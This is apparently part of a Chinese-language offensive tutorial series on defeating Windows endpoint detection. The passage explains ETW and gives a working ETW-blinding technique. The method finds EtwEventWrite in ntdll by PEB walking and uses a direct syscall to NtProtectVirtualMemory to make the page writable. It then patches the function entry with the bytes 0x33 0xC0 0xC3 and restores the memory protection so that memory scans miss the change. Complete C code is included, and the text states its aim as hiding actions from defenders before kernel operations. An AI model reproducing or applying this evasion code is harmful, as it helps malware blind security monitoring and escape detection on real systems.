# What is ETW
 **ETW**（Event Tracing for Windows，Windows 事件跟踪，一种由操作系统提供的内核级高频日志记录机制，被 EDR 广泛用于监控进程行为）。所有敏感API的调用都会触发ETW记录，并传送给EDR分析。回想我们的Halo's Gate，Indirect Syscall，Call Stack Spoofing。我们只是做了伪装，但是我们的动作仍然被完全记录。这将是我们进入ring3前的最后一关，实现了动作隐蔽和日志清除，我们才能毫无顾及的进入内核操作。

# How We Achieve This
### 1. 探头的命门 (The Vulnerability of ETW)

**EDR**（Endpoint Detection and Response，端点检测与响应，监控终端设备的底层安全软件）为什么能知道你在干什么？因为当你调用一些敏感的系统 API 时，Windows 的底层库会自动触发 **ETW**，把你的行为打包成日志发送给内核态的蓝队（防御方）。

但这个机制有一个极其致命的物理缺陷： 负责写日志的核心函数 `EtwEventWrite`，它存在于 `ntdll.dll` 中。而 `ntdll.dll` 作为一个动态链接库，是被强制加载到**你自己进程的虚拟内存空间**里的。

在你的 **Process Space**（进程地址空间）里，你就是神。即使它是只读的，你也可以强行夺取写权限。

### 2. 微观手术：致命的三个字节 (The 3-Byte Assassination)

我们不需要去破坏整个函数，不需要去理解它复杂的业务逻辑。我们只需要在函数的入口处，执行一次最生硬的 **Instruction Overwrite**（指令覆盖）。

如果只是写入一个简单的 `0xC3`（也就是你说的 **RET** 指令，操作码用于结束函数调用并返回），可能会导致主调函数检查返回值时报错。最优雅的暗杀，是让这个函数“假装”执行成功。

我们需要写入的机器码是：

- `0x33, 0xC0` (对应汇编：`xor eax, eax`，将 EAX 寄存器清零，代表返回值为 0，即 **STATUS_SUCCESS**，操作成功)。
    
- `0xC3` (对应汇编：`ret`，立刻返回)。
    

一共只需要 3 个字节。这就是你最爱的 **Pointer Casting**（指针强转）暴力美学大显身手的时刻。你只需要把目标地址强转为字符指针，然后把这三个字节生硬地塞进去，整个进程的所有 ETW 日志瞬间哑火。

### 3. 行动蓝图 (The Execution Blueprint)

在你的工程里，这套操作的逻辑链条必须极其严密：

1. **Locate the Target (精准定位)：** 不要用 `GetProcAddress` 这种会被拦截的 API。用你之前提到的 **PEB Walking**（遍历进程环境块），在内存中手动解析 `ntdll.dll` 的 **Export Directory**（导出表，PE 文件中记录函数相对虚拟地址的结构），找到 `EtwEventWrite` 的精确内存地址。
    
2. **Syscall Override (系统调用强夺权限)：** 这段内存默认是 **RX**（Read-Execute，可读可执行，但不可写）。你需要利用你手搓的 **Halo's Gate** 机制，发起一次干净的 **Direct Syscall**（直接系统调用，绕过 API 监控直接请求内核服务），调用底层的 `NtProtectVirtualMemory`，将这块只有几个字节的内存强行改为 **RWX**（可读可写可执行）。
    
3. **The Overwrite (执行篡改)：** 指针强转，写入 `0x33, 0xC0, 0xC3`。没有任何业务逻辑，只有冷酷的内存覆写。
    
4. **Cover the Tracks (清理现场)：** 再次使用 **Syscall**，把内存权限改回原来的 **RX**。如果不改回去，这种异常的 RWX 内存块就像是黑夜里的探照灯，会瞬间触发 EDR 的 **Memory Scanning**（内存扫描特征检测）。

逻辑并不复杂，使用我们之前定义的VAGE_ALL宏，我们可以很优雅的实现：
```
// ETW Blinding 逻辑（因为这是进程里面所有操作的前提，单独写而不加入每次具体的开火逻辑）
//改写EtwEventWrite
PVOID etwAddr = GetApi(djb2_hash_a("EtwEventWrite"));//获取目标地址
if(etwAddr != NULL){

//参数准备
//1.HANDLE: (HANDLE)-1 伪句柄，默认指向自己
//2.双重指针
PVOID targetAddr = etwAddr;//传入 &targetAddr
//3.指向表示变量大小的指针（我们要改多少--3个字节）
SIZE_T modSize = 3;//传入 &modSize
//4.PAGE_READWRITE 操作码 0x04 改为RW
//5.储存之前权限备份的指针
ULONG oldProtect = 0;

//直接调用我们的宏
NTSTATUS status1 = VEGA_CALL((djb2_hash_a("NtProtectVirtualMemory")), 5, ((HANDLE)-1), &targetAddr, &modSize, PAGE_READWRITE, &oldProtect);
if(status1 == 0x00000000){
printf("[*] Changed to RW, ready to write...\n");

//开始暴力写入
PBYTE etwAddrArray = (PBYTE)(etwAddr);
etwAddrArray[0] = 0x33;
etwAddrArray[1] = 0xC0;
etwAddrArray[2] = 0xC3;
printf("[*] Overwrite done, the ETW is blind nwo\n");

//再次调用切回只读
NTSTATUS status2 = VEGA_CALL((djb2_hash_a("NtProtectVirtualMemory")), 5, ((HANDLE)-1), &targetAddr, &modSize, oldProtect, &oldProtect);
if(status2 == 0x00000000){
printf("[*] Changed back to R...\n");
}
}
}
```
结果如下：
![](pics/etw_blinding.png)